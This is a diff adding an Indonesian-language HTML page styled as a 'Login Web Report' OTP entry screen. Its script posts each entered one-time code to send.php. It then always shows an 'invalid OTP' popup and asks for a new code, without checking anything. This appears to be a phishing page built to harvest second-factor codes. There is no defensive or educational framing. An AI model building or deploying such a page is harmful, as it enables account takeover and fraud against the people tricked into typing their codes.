@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#00897b" />
+  <title>Login Web Report</title>
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #00897b;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-start;
+      align-items: center;
+      height: 100vh;
+    }
+
+    h1.title {
+      text-align: center;
+      color: #fff;
+      font-size: 27px;
+      margin-top: 90px;
+      margin-bottom: 30px;
+      font-weight: bold;
+    }
+
+    .container {
+      background: #fff;
+      padding: 35px 25px 30px;
+      border-radius: 17px;
+      width: 320px;
+      text-align: left;
+      box-shadow: 0 4px 16px rgba(0,0,0,0.2);
+      animation: fadeIn 0.4s ease;
+    }
+
+    @keyframes fadeIn {
+      from {opacity: 0; transform: translateY(50px);}
+      to {opacity: 1; transform: translateY(0);}
+    }
+
+    h2 {
+      font-size: 20px;
+      color: #000;
+      font-weight: bold;
+      text-align: center;
+      margin-bottom: 6px;
+    }
+
+    p {
+      font-size: 11px;
+      color: #555;
+      text-align: center;
+      margin-bottom: 15px;
+    }
+
+    .input-group {
+      position: relative;
+      margin-bottom: 18px;
+    }
+
+    .input-group img {
+      position: absolute;
+      left: 14px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 17px;
+      height: 17px;
+      opacity: 0.95;
+      filter: brightness(0) saturate(100%) invert(89%) sepia(72%) saturate(460%) hue-rotate(3deg) brightness(103%) contrast(103%);
+    }
+
+    .input-group input {
+      width: 100%;
+      padding:9px 25px;
+      font-size: 15px;
+      border: 1.6px solid #00897b;
+      border-radius: 8px;
+      outline: none;
+      background: #fff;
+      text-align: center;
+      box-sizing: border-box;
+      color: #000;
+      transition: 0.2s;
+    }
+
+    .input-group input:focus {
+      border-color: #00897b;
+      box-shadow: 0 0 4px rgba(0, 137, 123, 0.5);
+    }
+
+    ::placeholder {
+      font-size: 13px;
+      color: #999;
+    }
+
+    /* ✅ Tombol sejajar sempurna dengan kolom */
+    button {
+      width: 100%;
+      padding: 10px;
+      background: #00897b;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: 0.3s;
+      box-shadow: 0 3px 6px rgba(0,0,0,0.2);
+      display: block;
+    }
+
+    button:hover {
+      background: #00796b;
+    }
+
+    button:disabled {
+      background: #aaa;
+      cursor: not-allowed;
+      box-shadow: none;
+    }
+
+    .popup {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.3);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      animation: fadeIn 0.3s ease;
+    }
+
+    .popup-content {
+      background: #fff;
+      width: 250px;
+      padding: 16px;
+      border-radius: 12px;
+      text-align: center;
+      box-shadow: 0 3px 8px rgba(0,0,0,0.25);
+      margin-top: 120px;
+    }
+
+    .popup h3 {
+      color: red;
+      margin-bottom: 8px;
+      font-size: 15px;
+      font-weight: bold;
+    }
+
+    .popup p {
+      font-size: 13px;
+      color: #333;
+      margin-bottom: 18px;
+    }
+
+    .popup button {
+      background: #00897b;
+      border: none;
+      color: #fff;
+      padding: 7px 22px;
+      border-radius: 6px;
+      font-size: 13px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+
+<body>
+
+  <h1 class="title">Login Web Report</h1>
+
+  <div class="container">
+    <h2>Kode OTP</h2>
+    <p>Masukkan kode OTP yang telah dikirim ke email Anda</p>
+    <form id="otpForm">
+      <div class="input-group">
+        <img src="https://cdn-icons-png.flaticon.com/512/3064/3064197.png" alt="icon">
+        <input type="number" id="otp" name="otp" placeholder="Masukkan kode OTP" required>
+      </div>
+      <button type="submit" id="submitBtn" disabled>OK</button>
+    </form>
+  </div>
+
+  <div class="popup" id="popup">
+    <div class="popup-content">
+      <h3>OTP tidak valid</h3>
+      <p>Silakan masukkan ulang kode OTP Anda.</p>
+      <button id="closePopup">Masukkan kode otp baru</button>
+    </div>
+  </div>
+
+  <script>
+    const otpInput = document.getElementById('otp');
+    const btn = document.getElementById('submitBtn');
+    const popup = document.getElementById('popup');
+    const closePopup = document.getElementById('closePopup');
+    const form = document.getElementById('otpForm');
+
+    otpInput.addEventListener('input', function() {
+      this.value = this.value.replace(/\D/g, '');
+      if (this.value.length > 6) this.value = this.value.slice(0, 6);
+      btn.disabled = (this.value.length < 4);
+    });
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+      const xhr = new XMLHttpRequest();
+      xhr.open("POST", "send.php", true);
+      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+      xhr.send("otp=" + otpInput.value);
+      popup.style.display = "flex";
+      form.reset();
+      btn.disabled = true;
+    });
+
+    closePopup.addEventListener('click', () => popup.style.display = "none");
+  </script>
+
+</body>
+</html>
